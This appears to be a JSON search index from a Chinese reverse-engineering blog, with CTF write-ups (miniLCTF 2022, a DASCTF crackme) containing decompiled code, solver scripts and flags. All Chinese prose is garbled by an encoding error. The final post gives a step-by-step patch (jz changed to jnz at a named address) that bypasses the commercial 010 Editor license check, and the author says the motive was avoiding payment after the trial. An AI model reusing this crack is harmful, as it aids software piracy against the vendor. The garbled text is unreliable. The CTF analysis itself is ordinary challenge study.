0xf6, 0xe7, 0x15, 0xab, 0xbd, 0xa1, 0x80, 0x85, 0x63, 0x77, 0xe1, 0xd7, 0x93, 0xc7, 0xa3 } æœ€åå¾—çŸ¥æ•´ä¸ªæµç¨‹æ˜¯ä¸ªå»æ‰äº†åˆå§‹åŒ–çš„RC5ï¼ˆnot RC4å°±åœ¨è¿™ exp from Crypto.Util.number import * enc_flag = [0x4bc21dbb95ef82ca, 0xf57becae71b547be, 0x80a1bdab15e7f6cd, 0xa3c793d7e1776385] key_const_1 = 0x0000000064627421 key_const_2 = 0x0000000079796473 rol = lambda val, r_bts, max_bits: \\ (val \u003c\u003c r_bits%max_bits) \u0026 (2**max_bits-1) | \\ ((val \u0026 (2**max_bits-1)) \u003e\u003e (max_bits-(r_bits%max_bits))) ror = lambda val, r_bits, max_bits: \\ ((val \u0026 (2**max_bits-1)) \u003e\u003e r_bits%max_bits) | \\ (val \u003c\u003c (max_bits-(r_bits%max_bits)) \u0026 (2**max_bits-1)) left_8_bytes = 0x4bc21dbb95ef82ca right_8_bytes = 0xf57becae71b547be for j in range(12): right_8_bytes = ror((right_8_bytes - key_const_2), left_8_bytes, 64) ^ left_8_bytes left_8_bytes = ror((left_8_bytes - key_const_1), right_8_bytes,64) ^ right_8_bytes left_8_bytes -= key_const_1 right_8_bytes -= key_const_2 print(long_to_bytes(left_8_bytes), long_to_bytes(right_8_bytes)) å­—èŠ‚åºé—®é¢˜ï¼Œæœ€åè¦é€†è¿‡æ¥çœ‹ flagminiLCTF{I_hate_U_r1sc-V!} ","date":"2022-05-19","objectID":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/:1:0","tags":["CTF","reverse"],"title":"miniLCTF 2022 Reverse å¤ç›˜ \u0026 wp","uri":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/"},{"categories":["WriteUps"],"content":"lemon lemonè¯­è¨€é€†å‘ï¼Œç»™äº†ä¸€æ®µå­—èŠ‚ç  åæ§½ä¸€ä¸‹å®˜æ–¹ä»“åº“readmeå†™å¾—å¤ªç®€ç•¥äº†ï¼Œè´¹äº†å¥½å¤§åŠ²æ‰ææ‡‚å·¥å…·æ€ä¹ˆç”¨ ç„¶åå°±æ˜¯ä½“åŠ›æ´»äº† çŒœä¸€ä¸‹ï¼Œå†™ç‚¹ä»£ç ï¼Œ\\disä¸€ä¸‹ï¼Œå’Œé¢˜ç›®æ–‡ä»¶æ¯”å¯¹ä¸€ä¸‹ï¼Œè¿˜åŸæºä»£ç  var v0 = 221492336; def next(){ v0 = (v0*3735928559 + 2974593325) % 4294967295; return v0; } class RunMe(){ def __init__(var n){ self.enc = []; self.flag = []; self.res = [2141786733, 76267819, 37219027, 219942343, 755999918, 701306806, 532732060, 334234642, 524809386, 333469062, 160092960, 126810196, 238089888, 301365991, 258515107, 424705310, 1041878913, 618187854, 4680810, 827308967, 66957703, 924471115, 735310319, 541128627, 47689903, 459905620, 495518230, 167708778, 586337393, 521761774, 861166604, 626644061, 1030425184, 665229750, 330150339]; for (var v1=0; v1\u003cn; v1+=1){ self.enc.append(next()); } } def sign(var x, var y){ for(var v2=0; v2\u003c35; v2+=1){ self.flag.append(x[v2] ^ y[v2]); } } } print(\"Starting\"); var v5 = RunMe(35); v5.sign(v5.res, v5.enc); print(v5.flag); print(\"Done\"); è¿è¡Œå¾—flag flagminiLctf{l3m0n_1s_s0_s0urrR77RrrR7} ","date":"2022-05-19","objectID":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/:2:0","tags":["CTF","reverse"],"title":"miniLCTF 2022 Reverse å¤ç›˜ \u0026 wp","uri":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/"},{"categories":["WriteUps"],"content":"whatAssembly åœ¨jsé‡Œè—ç€ä¸€ä¸ªflag.wasmï¼Œç›´æ¥è¯·æ±‚ä¸‹è½½å°±è¡Œ ä¸‹è½½å®˜æ–¹å·¥å…·åŒ…wabt ä½¿ç”¨wasm2cå·¥å…·å°†wasmæ–‡ä»¶åç¼–è¯‘æˆflag.cæ–‡ä»¶ï¼Œ./wasm2c wasm.wasm -o wasm.cï¼Œä½†æ˜¯å¯è¯»æ€§ä¸é«˜ ç»§ç»­ä¼˜åŒ–ï¼ŒæŠŠwasm-rt.hå’Œwasm.hå’Œflag.cæ”¾åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œgcc -c flag.c -o flagï¼Œè¿›è¡Œåªç¼–è¯‘ä¸é“¾æ¥ï¼Œè¿™ä¸€æ­¥å¯èƒ½ä¼šå‡ºå¥‡æ€ªçš„é—®é¢˜ï¼Œç›®å‰åŸå› ä¸æ˜ æˆåŠŸåå°±å¯æ‹–è¿›idaè¿›è¡Œé™æ€åˆ†æï¼Œä¼šå¥½çœ‹å¾ˆå¤š å‰é¢è¿˜å°è¯•äº†jeb4.0ï¼ˆæ”¯æŒwasmç›´æ¥åæ±‡ç¼–/åç¼–è¯‘ï¼‰ï¼Œå¯ç”¨ï¼Œä½†å·¨ä¸‘ï¼Œæ•ˆæœè¿œä¸å¦‚idaï¼Œæ•…æ”¾å¼ƒ ä»¥ä¸‹ç»“åˆå‡ºé¢˜äººæ”¾å‡ºçš„æºç åˆ†æï¼Œé™„å¸¦è¯¦ç»†æ³¨é‡Š checkå‡½æ•° __int64 __fastcall w2c_check(unsigned int flag, unsigned int key, unsigned int enc) { int v3; // eax unsigned int check_sp; // [rsp+24h] [rbp-47Ch] unsigned int v7; // [rsp+40h] [rbp-460h] unsigned int v8; // [rsp+44h] [rbp-45Ch] unsigned int v9; // [rsp+48h] [rbp-458h] unsigned int v10; // [rsp+4Ch] [rbp-454h] unsigned int v11; // [rsp+50h] [rbp-450h] unsigned int v12; // [rsp+54h] [rbp-44Ch] signed int v13; // [rsp+90h] [rbp-410h] int v14; // [rsp+B4h] [rbp-3ECh] unsigned int flag_cpy_len; // [rsp+DCh] [rbp-3C4h] unsigned int v16; // [rsp+E0h] [rbp-3C0h] unsigned int flag_cpy_addr; // [rsp+E4h] [rbp-3BCh] unsigned int v18; // [rsp+E8h] [rbp-3B8h] unsigned int v19; // [rsp+ECh] [rbp-3B4h] unsigned int v20; // [rsp+F4h] [rbp-3ACh] unsigned int v21; // [rsp+F8h] [rbp-3A8h] int key_addr; // [rsp+120h] [rbp-380h] unsigned int v23; // [rsp+128h] [rbp-378h] unsigned int v24; // [rsp+12Ch] [rbp-374h] unsigned int v25; // [rsp+140h] [rbp-360h] int i; // [rsp+160h] [rbp-340h] int v27; // [rsp+194h] [rbp-30Ch] int v28; // [rsp+198h] [rbp-308h] int v29; // [rsp+1A0h] [rbp-300h] unsigned int v30; // [rsp+1A8h] [rbp-2F8h] int v31; // [rsp+1B4h] [rbp-2ECh] int v32; // [rsp+300h] [rbp-1A0h] int v33; // [rsp+30Ch] [rbp-194h] int v34; // [rsp+324h] [rbp-17Ch] char v35; // [rsp+32Ch] [rbp-174h] unsigned int v36; // [rsp+34Ch] [rbp-154h] char v37; // [rsp+374h] [rbp-12Ch] unsigned int v38; // [rsp+39Ch] [rbp-104h] int v39; // [rsp+3A0h] [rbp-100h] int v40; // [rsp+3ACh] [rbp-F4h] int v41; // [rsp+3BCh] [rbp-E4h] char v42; // [rsp+3CCh] [rbp-D4h] unsigned int v43; // [rsp+3ECh] [rbp-B4h] char v44; // [rsp+414h] [rbp-8Ch] unsigned int v45; // [rsp+43Ch] [rbp-64h] unsigned int v46; // [rsp+458h] [rbp-48h] unsigned int v47; // [rsp+460h] [rbp-40h] int v48; // [rsp+46Ch] [rbp-34h] unsigned int v49; // [rsp+470h] [rbp-30h] unsigned int v50; // [rsp+470h] [rbp-30h] unsigned int v51; // [rsp+470h] [rbp-30h] unsigned int v52; // [rsp+470h] [rbp-30h] unsigned int v53; // [rsp+470h] [rbp-30h] unsigned int v54; // [rsp+470h] [rbp-30h] unsigned int v55; // [rsp+474h] [rbp-2Ch] __int64 v56; // [rsp+480h] [rbp-20h] __int64 v57; // [rsp+498h] [rbp-8h] w2c___stack_pointer -= 112; // new vm stack frame check_sp = w2c___stack_pointer; i32_store(\u0026w2c_memory, (unsigned int)w2c___stack_pointer + 104LL, flag);// push flag i32_store(\u0026w2c_memory, check_sp + 100LL, key);// push key i32_store(\u0026w2c_memory, check_sp + 96LL, enc); // push enc v56 = i64_load(\u0026w2c_memory, 1032LL); i64_store(\u0026w2c_memory, check_sp + 88, v56); // table v57 = i64_load(\u0026w2c_memory, 1024LL); i64_store(\u0026w2c_memory, check_sp + 80, v57); // another table v7 = i32_load(\u0026w2c_memory, check_sp + 104LL); // push len(flag) v8 = w2c_strlen(v7); i32_store(\u0026w2c_memory, check_sp + 76LL, v8); v9 = i32_load(\u0026w2c_memory, check_sp + 100LL); // push len(key) v10 = w2c_strlen(v9); i32_store(\u0026w2c_memory, check_sp + 72LL, v10); v11 = i32_load(\u0026w2c_memory, check_sp + 96LL); // push len(enc) v12 = w2c_strlen(v11); i32_store(\u0026w2c_memory, check_sp + 68LL, v12); if ( (int)i32_load(\u0026w2c_memory, check_sp + 72LL) \u003e= 8// len(key) \u003e= 8 \u0026\u0026 (v13 = 4 * i32_load(\u0026w2c_memory, check_sp + 76LL), v13 \u003e (int)(i32_load(\u0026w2c_memory, check_sp + 68LL) - 32))// 4 * len(flag) \u003e len(enc) - 32 \u0026\u0026 (v14 = 4 * i32_load(\u0026w2c_memory, check_sp + 76LL), v14 \u003c= (int)i32_load(\u0026w2c_memory, check_sp + 68LL)) )// 4 * len(flag) \u003c= len(enc) { flag_cpy_len = (i32_load(\u0026w2c_memory, check_sp + 76LL) + 15) \u0026 0xFFFFFFF0;// flag_cpy_len = (flag_len + 15) \u0026 ~15 i32_store(\u0026w2c_memory, check_sp + 64LL, flag_cpy_len); v16 = i32_load(\u0026w2c_memory, check_sp + 64LL); flag_cpy_addr = w2c_dlmalloc(v16); // malloc(flag_cpy_len) i32_store(\u0026w2c_memory, check_sp + 60LL, flag","date":"2022-05-19","objectID":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/:3:0","tags":["CTF","reverse"],"title":"miniLCTF 2022 Reverse å¤ç›˜ \u0026 wp","uri":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/"},{"categories":["WriteUps"],"content":"twin ref:P.Z.å¸ˆå‚…çš„wp åˆ›å»ºæˆ–ç»ˆæ­¢çº¿ç¨‹æ—¶ï¼ŒTLSå›è°ƒå‡½æ•°éƒ½ä¼šè‡ªåŠ¨è°ƒç”¨æ‰§è¡Œ åœ¨idaé‡Œæ‰¾åˆ°TlsCallback_0ï¼Œæ‰“å¼€æ˜¯ç©ºçš„ï¼ŒåŸå› æ˜¯é‡Œé¢æœ‰ä¸ªåè°ƒè¯• æœ‰ä¸€å¥call $+5å®é™…æ˜¯åŸåœ°tpï¼Œåä¸€å¥è®¡ç®—æ­£ç¡®çš„åœ°å€ï¼Œç„¶åretnå®ç°è·³è½¬ï¼Œç›´æ¥æŠŠå®ƒä»è¿™å¥ä¸€ç›´åˆ°retnå…¨éƒ½nopæ‰å³å¯ï¼Œåé¢è¿˜æœ‰å¾ˆå¤šå¤„åŒç† ä¿®å¤åçš„TlsCallback_0å‡½æ•° void __cdecl TlsCallback_0(int a1, int a2) { char *v2; // eax char Buffer[80]; // [esp+10h] [ebp-11Ch] BYREF struct _STARTUPINFOA StartupInfo; // [esp+60h] [ebp-CCh] BYREF struct _PROCESS_INFORMATION ProcessInformation; // [esp+A4h] [ebp-88h] BYREF char v7[22]; // [esp+B8h] [ebp-74h] BYREF char v8[4]; // [esp+CEh] [ebp-5Eh] BYREF char v9[44]; // [esp+D4h] [ebp-58h] BYREF char v10[12]; // [esp+100h] [ebp-2Ch] BYREF CHAR Name[8]; // [esp+10Ch] [ebp-20h] BYREF CHAR ApplicationName[8]; // [esp+114h] [ebp-18h] BYREF char v13[8]; // [esp+11Ch] [ebp-10h] BYREF char Format[7]; // [esp+124h] [ebp-8h] BYREF uint8_t v15; // [esp+12Bh] [ebp-1h] if ( a2 == 1 ) { memset(Buffer, 0, sizeof(Buffer)); sub_401930(Buffer); v15 = 0; v15 = NtCurrentPeb()-\u003eBeingDebugged; if ( !v15 ) *(\u0026TlsCallbacks + 1) = (int (__cdecl *)(int, int))sub_401D60; strcpy(Name, \"93\u003e8\"); sub_4018C0(Name); hObject = CreateFileMappingA(0, 0, 4u, 0, 0x1000u, Name); *(_DWORD *)dword_404448 = MapViewOfFile(hObject, 0xF001Fu, 0, 0, 0x1000u); v7[0] = 47; v7[1] = 19; v7[2] = 26; v7[3] = 30; v7[4] = 12; v7[5] = 26; v7[6] = 95; v7[7] = 22; v7[8] = 17; v7[9] = 15; v7[10] = 10; v7[11] = 11; v7[12] = 95; v7[13] = 6; v7[14] = 16; v7[15] = 10; v7[16] = 13; v7[17] = 95; v7[18] = 25; v7[19] = 19; v7[20] = 30; v7[21] = 24; strcpy(v8, \"E_\"); v2 = (char *)sub_4018C0(v7); sub_401930(v2); Format[0] = 90; Format[1] = 12; Format[2] = 0; sub_4018C0(Format); sub_401130(Format, dword_404448[0]); } if ( !a2 ) { ApplicationName[0] = 81; ApplicationName[1] = 80; ApplicationName[2] = 11; ApplicationName[3] = 18; ApplicationName[4] = 15; ApplicationName[5] = 0; sub_4018C0(ApplicationName); sub_401410(); memset(\u0026StartupInfo, 0, sizeof(StartupInfo)); StartupInfo.cb = 68; CreateProcessA(ApplicationName, 0, 0, 0, 0, 3u, 0, 0, \u0026StartupInfo, \u0026ProcessInformation); v10[0] = 28; v10[1] = 16; v10[2] = 13; v10[3] = 13; v10[4] = 26; v10[5] = 28; v10[6] = 11; v10[7] = 117; v10[8] = 0; v13[0] = 8; v13[1] = 13; v13[2] = 16; v13[3] = 17; v13[4] = 24; v13[5] = 117; v13[6] = 0; v9[0] = 47; v9[1] = 19; v9[2] = 26; v9[3] = 30; v9[4] = 12; v9[5] = 26; v9[6] = 95; v9[7] = 28; v9[8] = 19; v9[9] = 16; v9[10] = 12; v9[11] = 26; v9[12] = 95; v9[13] = 11; v9[14] = 23; v9[15] = 26; v9[16] = 95; v9[17] = 27; v9[18] = 26; v9[19] = 29; v9[20] = 10; v9[21] = 24; v9[22] = 24; v9[23] = 26; v9[24] = 13; v9[25] = 95; v9[26] = 30; v9[27] = 17; v9[28] = 27; v9[29] = 95; v9[30] = 11; v9[31] = 13; v9[32] = 6; v9[33] = 95; v9[34] = 30; v9[35] = 24; v9[36] = 30; v9[37] = 22; v9[38] = 17; v9[39] = 117; v9[40] = 0; sub_401510(ApplicationName, (int)\u0026ProcessInformation); if ( dword_404440 == 1 ) { sub_4012C0((_DWORD *)(*(_DWORD *)dword_404448 + 20), 5, (int)\u0026unk_40405C); if ( !memcmp((const void *)(*(_DWORD *)dword_404448 + 20), \u0026unk_40402C, 0x14u) ) { sub_4018C0(v10); sub_401930(v10); LABEL_13: CloseHandle(hObject); return; } } else if ( dword_404440 == -2 ) { sub_4018C0(v9); sub_401930(v9); goto LABEL_13; } sub_4018C0(v13); sub_401930(v13); goto LABEL_13; } } å…¶ä¸­a2å­˜å‚¨äº†æ˜¯åˆ›å»ºè¿›ç¨‹è¿˜æ˜¯é€€å‡ºè¿›ç¨‹çš„çŠ¶æ€ï¼Œä»è€Œæ‰§è¡Œä¸åŒçš„ä»£ç  åœ¨ç¨‹åºå¼€å§‹çš„æ—¶å€™é¦–å…ˆè¿›å…¥ç¬¬ä¸€ä¸ªifä¸­çš„å†…å®¹ æ³¨æ„ä¸‹é¢ä¸¤å¥ if ( !v15 ) *(\u0026TlsCallbacks + 1) = (int (__cdecl *)(int, int))sub_401D60; æŠŠsub_401D60æ”¾åœ¨äº†TlsCallbacksä¹‹åï¼Œå½¢æˆäº†ä¸ªåˆ—è¡¨ï¼Œåˆ›å»ºæˆ–ç»ˆæ­¢çº¿ç¨‹æ—¶ä¼šä¾æ¬¡è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•° æ¥ä¸‹æ¥é‡ç‚¹åœ¨ç”¨åˆ›å»ºäº†æ–°çš„æ–‡ä»¶tmp åŠ¨è°ƒå¯å¾—sub_401130æ˜¯scanfçš„åŠŸèƒ½ æ¥ç€ä¼šè¿›å…¥ä¸Šé¢åœ¨TlsCallbacksä¹‹ååŠ ä¸Šçš„sub_401D60 void __cdecl __noreturn sub_401D60(int a1, int a2) { CHAR ModuleName[16]; // [esp+0h] [ebp-1Ch] BYREF CHAR ProcName[12]; // [esp+10h] [ebp-Ch] BYREF if ( a2 == 1 ) { ProcName[0] = 40; ProcName[1] = 13; ProcName[2] = 22; ProcName[3] = 11; ProcName[4] = 26; ProcName[5] = 57; ProcName[6] = 22; ProcName[7] = 19; ProcName[8] = 26; ProcName[9] = 0; ModuleName[0] = 20; ModuleName[1] = 26; ModuleName[2] = 13; ModuleName[3] = 17; ModuleName[4] = 26; ModuleName[5] = 19; ModuleName[6] = 76; ModuleName[7] = 77; ModuleName[8] = 81; ModuleName[9] = 27; ModuleName[10] = ","date":"2022-05-19","objectID":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/:4:0","tags":["CTF","reverse"],"title":"miniLCTF 2022 Reverse å¤ç›˜ \u0026 wp","uri":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/"},{"categories":["WriteUps"],"content":"CyberServer å’•å’•å’• ç­‰æˆ‘å•¥æ—¶å€™èƒ½å†™ä¸ªè¿™ç©æ„å†å›æ¥çœ‹å§ ","date":"2022-05-19","objectID":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/:5:0","tags":["CTF","reverse"],"title":"miniLCTF 2022 Reverse å¤ç›˜ \u0026 wp","uri":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/"},{"categories":["WriteUps"],"content":"Crackme è¿è¡Œä¸€ä¸‹çœ‹å›¾æ ‡çŸ¥é“æ˜¯MFC æ‹–è¿›idaæœç´¢å­—ç¬¦ä¸²wrongå°±èƒ½æ‰¾åˆ°äº‹ä»¶å¤„ç†å‡½æ•° int __thiscall sub_1131E0(struct_this *this) { const void *key_addr; // eax const void *flag_addr; // eax int result; // eax unsigned int key_len; // [esp+18h] [ebp-230h] size_t flag_len; // [esp+20h] [ebp-228h] BYREF void *md5_top_half_key; // [esp+24h] [ebp-224h] BYREF const void *md5_bottom_half_key; // [esp+28h] [ebp-220h] BYREF BYTE *v9; // [esp+2Ch] [ebp-21Ch] BYREF size_t dwDataLen; // [esp+30h] [ebp-218h] BYREF size_t v11; // [esp+34h] [ebp-214h] BYREF DWORD v12; // [esp+38h] [ebp-210h] BYREF BYTE flag[260]; // [esp+3Ch] [ebp-20Ch] BYREF BYTE key[260]; // [esp+140h] [ebp-108h] BYREF CWnd::UpdateData((CWnd *)this, 1); memset(key, 0, sizeof(key)); memset(flag, 0, sizeof(flag)); key_len = strlen(\u0026this-\u003egap4[212]); flag_len = strlen(\u0026this-\u003egap4[208]); dwDataLen = 0; v11 = 0; v12 = 0; key_addr = (const void *)sub_112590(\u0026this-\u003egap4[212], key_len); memmove(key, key_addr, key_len); flag_addr = (const void *)sub_112590(\u0026this-\u003egap4[208], flag_len); memmove(flag, flag_addr, flag_len); if ( key_len != 8 \u0026\u0026 flag_len != 32 ) return wrong((CWnd *)this); hash_encode(key, key_len \u003e\u003e 1, 0x8003u, (int)\u0026md5_top_half_key, (int)\u0026dwDataLen);// md5 hash_encode(\u0026key[4], key_len \u003e\u003e 1, 0x8004u, (int)\u0026md5_bottom_half_key, (int)\u0026v11);// sha1 hash_encode(key, key_len, 0x8003u, (int)\u0026v9, (int)\u0026v12);// md5 memcmp(md5_top_half_key, \u0026this-\u003echarDC, dwDataLen); if ( memcmp(md5_bottom_half_key, \u0026this-\u003echar1E0, v11) ) return wrong((CWnd *)this); md5_and_AES_encrypt(v9, v12, flag, \u0026flag_len, 0x104u); if ( !memcmp(flag, \u0026this-\u003echar2E4, flag_len) ) result = success((CWnd *)this); else result = wrong((CWnd *)this); return result; } ç»“åˆåŠ¨è°ƒå¾ˆå®¹æ˜“ææ¸…æ¥šå„ä¸ªå˜é‡ã€å‡½æ•°çš„æ„ä¹‰ï¼Œä½†è¿™é‡Œæœ‰ä¸ªåè°ƒå¾ˆéš¾å‘ç° å‚è§ZwSetInformationThread - CTF Wiki å­—ç¬¦ä¸²é‡ŒæœZwSetInformationThreadå¯æ‰¾åˆ°è¿™ä¸ªå‡½æ•° int __thiscall sub_112E60(LPARAM *this) { const CHAR *v1; // eax HMODULE v2; // eax HANDLE v3; // eax FARPROC ZwSetInformationThread; // [esp+8h] [ebp-24h] int i; // [esp+14h] [ebp-18h] int j; // [esp+14h] [ebp-18h] char v9[4]; // [esp+18h] [ebp-14h] BYREF int v10; // [esp+28h] [ebp-4h] CDialog::OnInitDialog((CDialog *)this); if ( sub_113AC0(0) ) { sub_111CB0(4u); sub_112100(v9); v10 = 0; sub_113D40(101); if ( !std::string::empty((std::string *)v9) ) { sub_113A60(0x800u, 0, 0); v1 = (const CHAR *)std::_Ptr_base\u003c_EXCEPTION_RECORD const\u003e::get(v9); sub_113A60(0, 0x10u, v1); } v10 = -1; sub_1129F0(v9); } sub_113A30(this[52], 1u); sub_113A30(this[52], 0); v2 = GetModuleHandleA(\"ntdll.dll\"); ZwSetInformationThread = GetProcAddress(v2, \"ZwSetInformationThread\");//åè°ƒ v3 = GetCurrentThread(); ((void (__stdcall *)(HANDLE, int, _DWORD, _DWORD))ZwSetInformationThread)(v3, 17, 0, 0); for ( i = 0; i \u003c 16; ++i ) *((_BYTE *)this + i + 220) ^= i; for ( j = 0; j \u003c 20; ++j ) *((_BYTE *)this + j + 480) ^= j; return 1; } å¹¶ä¸æ˜¯ç®€å•çš„è°ƒç”¨äº†windowsçš„ç³»ç»Ÿå‡½æ•°ï¼Œå¯¼è‡´importçª—å£æ‰¾ä¸åˆ°ï¼Œä¹Ÿå¢åŠ äº†ä¸å°‘éš¾åº¦ å…·ä½“ç»•è¿‡æ–¹æ³•ctf-wikiä¹Ÿå†™çš„å¾ˆæ¸…æ¥šï¼Œä¸å†èµ˜è¿° ç»“åˆé‡å‘½åçš„å‡½æ•°åº”è¯¥èƒ½çœ‹å¾—å¾ˆæ¸…æ¥š hash_encodeå‡½æ•° bool __stdcall sub_113510(BYTE *pbData, DWORD dwDataLen, ALG_ID Algid, int a4, int a5) { BYTE *v6; // [esp+10h] [ebp-20h] BOOL v7; // [esp+18h] [ebp-18h] BYTE v8[4]; // [esp+1Ch] [ebp-14h] BYREF DWORD pdwDataLen; // [esp+20h] [ebp-10h] BYREF HCRYPTPROV phProv; // [esp+24h] [ebp-Ch] BYREF HCRYPTHASH phHash; // [esp+28h] [ebp-8h] BYREF phProv = 0; phHash = 0; v6 = 0; *(_DWORD *)v8 = 0; pdwDataLen = 0; v7 = CryptAcquireContextA(\u0026phProv, 0, 0, 0x18u, 0xF0000000); if ( v7 ) { v7 = CryptCreateHash(phProv, Algid, 0, 0, \u0026phHash); if ( v7 ) { v7 = CryptHashData(phHash, pbData, dwDataLen, 0); if ( v7 ) { pdwDataLen = 4; v7 = CryptGetHashParam(phHash, 4u, v8, \u0026pdwDataLen, 0); if ( v7 ) { v6 = (BYTE *)sub_114540(*(size_t *)v8); if ( v6 ) { memset(v6, 0, *(size_t *)v8); v7 = CryptGetHashParam(phHash, 2u, v6, (DWORD *)v8, 0); if ( v7 ) { *(_DWORD *)a4 = v6; *(_DWORD *)a5 = *(_DWORD *)v8; } } else { v7 = 0; } } } } } if ( !v7 \u0026\u0026 v6 ) sub_11453B(v6); if ( phHash ) CryptDestroyHash(phHash); if ( phProv ) CryptReleaseContext(phProv, 0); return v7; } é‡Œé¢å…¨æ˜¯windowsçš„APIå‡½æ•°ï¼Œé‡ç‚¹çœ‹Algidå‚æ•°ï¼Œå†³å®šäº†hashçš„ç§ç±»ï¼Œå…·ä½“å‚è§ALG_ID (Win","date":"2022-04-28","objectID":"/2022/04/2022dasctf-x-fate-re-crackme-wp/:1:0","tags":["CTF","reverse"],"title":"2022DASCTF X FATE RE Crackme wp","uri":"/2022/04/2022dasctf-x-fate-re-crackme-wp/"},{"categories":["Binary"],"content":"010editorç™»é™†ç»•è¿‡ ","date":"2022-04-05","objectID":"/2022/04/010editor%E9%80%86%E5%90%91-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87/:1:0","tags":["reverse","crack"],"title":"010Editoré€†å‘-ç™»é™†ç»•è¿‡","uri":"/2022/04/010editor%E9%80%86%E5%90%91-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87/"},{"categories":["Binary"],"content":"patch__1.0 èµ·å› æ˜¯30å¤©è¯•ç”¨æœŸåˆ°äº†ï¼Œåˆæƒ³ç™½å«–ï¼Œäºæ˜¯è¯•è¯•é€†å‘æå®ƒï¼Œç¡®å®ä¸éš¾ æ‹–è¿›idaé™æ€åˆ†æå°±è¡Œ stringçª—å£æœç´¢licenseï¼Œæ‰¾åˆ°å…³é”®è¯­å¥ Password accepted. This license entitles you to:\\n\\n - Free Upgrades\\n - Free Support\\n - Free Repository Updates\\n\\nuntil æ˜¾ç„¶æ˜¯éªŒè¯é€šè¿‡åçš„æç¤ºè¯­å¥ï¼Œè·Ÿè¿›å» äº¤å‰å¼•ç”¨å®šä½loc_72F4D8å‡½æ•° .text:000000000072F4D8 loc_72F4D8: ; CODE XREF: sub_72EA00+6AEâ†‘j .text:000000000072F4D8 mov rdi, [r15] .text:000000000072F4DB ; try { .text:000000000072F4DB call _ZN9RRegister14GetExpiryQDateEv ; RRegister::GetExpiryQDate(void) .text:000000000072F4E0 lea rdi, unk_8ACB72 ; this .text:000000000072F4E7 mov esi, 0Ch ; char * .text:000000000072F4EC mov [rsp+228h+var_68], rax .text:000000000072F4F4 call __ZN7QString16fromAscii_helperEPKci ; QString::fromAscii_helper(char const*,int) .text:000000000072F4F4 ; } // starts at 72F4DB .text:000000000072F4F9 mov [rsp+228h+var_48], rax .text:000000000072F501 lea rbp, [rsp+228h+var_48] .text:000000000072F509 lea rax, [rsp+228h+var_128] .text:000000000072F511 lea rsi, [rsp+228h+var_68] ; QString * .text:000000000072F519 mov rdx, rbp .text:000000000072F51C mov rdi, rax ; this .text:000000000072F51F mov r13, rax .text:000000000072F522 mov [rsp+228h+var_220], rax .text:000000000072F527 ; try { .text:000000000072F527 call __ZNK5QDate8toStringERK7QString ; QDate::toString(QString const\u0026) .text:000000000072F527 ; } // starts at 72F527 .text:000000000072F52C lea r14, [rsp+228h+var_118] .text:000000000072F534 lea rsi, aPasswordAccept_0 ; \"Password accepted. This license entitle\"... .text:000000000072F53B mov edx, 78h ; 'x' ; int .text:000000000072F540 mov rdi, r14 ; this .text:000000000072F543 ; try { .text:000000000072F543 call __ZN7QString15fromUtf8_helperEPKci ; QString::fromUtf8_helper(char const*,int) å†å¾€ä¸Šæ‰¾å‘ç°loc_72F0A8å‡½æ•° .text:000000000072F0A8 loc_72F0A8: ; CODE XREF: sub_72EA00+5FAâ†‘j .text:000000000072F0A8 ; sub_72EA00+608â†‘j .text:000000000072F0A8 cmp ebp, 0DBh .text:000000000072F0AE jz loc_72F4D8;ä¸Šä¸ªå‡½æ•°å…¥å£ .text:000000000072F0B4 cmp ebp, 0EDh .text:000000000072F0BA jz loc_72F1C8 .text:000000000072F0C0 cmp ebp, 20Ch .text:000000000072F0C6 jz loc_72F1C8 .text:000000000072F0CC cmp r13d, 93h .text:000000000072F0D3 jz short loc_72F148 .text:000000000072F0D5 lea rdi, aInvalidNameOrP ; \"Invalid name or password. Please enter \"... .text:000000000072F0DC mov esi, 90h ; char * .text:000000000072F0E1 call __ZN7QString16fromAscii_helperEPKci ; QString::fromAscii_helper(char const*,int) .text:000000000072F0E1 ; } // starts at 72F09D .text:000000000072F0E6 lea rbp, [rsp+228h+var_48] .text:000000000072F0EE mov [rsp+228h+var_48], rax .text:000000000072F0F6 mov rdi, rbp .text:000000000072F0F9 ; try { .text:000000000072F0F9 call _Z10R_ShowInfoRK7QString ; R_ShowInfo(QString const\u0026) .text:000000000072F0F9 ; } // starts at 72F0F9 .text:000000000072F0FE jmp loc_72F04B è·³è½¬è¯­å¥jz loc_72F4D8ï¼Œå°è¯•æ€§æŠŠjzæ”¹æˆjnzï¼Œapplyä¸€ä¸‹ é‡æ–°è¿›å…¥010ï¼Œå¼¹å‡ºregisterçª—å£ï¼Œéšä¾¿è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œç‚¹å‡»check license å¼¹å‡ºæˆåŠŸçª—å£ ç‚¹å‡»okæˆåŠŸè¿›å…¥åº”ç”¨ï¼ŒæˆåŠŸï¼ ","date":"2022-04-05","objectID":"/2022/04/010editor%E9%80%86%E5%90%91-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87/:1:1","tags":["reverse","crack"],"title":"010Editoré€†å‘-ç™»é™†ç»•è¿‡","uri":"/2022/04/010editor%E9%80%86%E5%90%91-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87/"},{"categories":["Binary"],"content":"patch__2.0 ä¸Šæ¬¡æå®Œä¹‹åèƒ½ç”¨æ˜¯èƒ½ç”¨ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½è¦ç‚¹å‡»ä¸Šé¢ä¸¤å¼ å›¾çš„Check Licenseå’ŒOKï¼Œååˆ†ä¸æ–¹ä¾¿ï¼Œäºæ˜¯å°è¯•ä½¿2ä¸ªç•Œé¢ä¸å†å¼¹å‡º ä»”ç»†çœ‹mainå‡½æ•°ï¼Œè¿˜æ˜¯æŒºæ¸…æ™°çš„ __int64 